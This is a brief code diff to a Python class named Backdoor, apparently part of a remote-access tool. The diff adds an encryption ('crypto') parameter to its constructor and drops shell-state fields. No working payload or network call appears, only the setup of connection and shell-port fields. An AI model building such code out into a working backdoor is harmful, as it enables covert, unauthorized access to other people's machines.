@@ -4,13 +4,12 @@ from socket import error as socket_error
 
 class Backdoor():
 
-    def __init__(self, conn, ip_addr, port, shell_port):
+    def __init__(self, conn, ip_addr, port, shell_port, crypto):
         self.conn = conn
         self.ip_addr = ip_addr
         self.port = port
         self.shell_port = shell_port
-        self.shell = 1
-        self.cmd = ""
+        self.crypto = crypto
 
     def get_cmd(self):
         cmd = ""
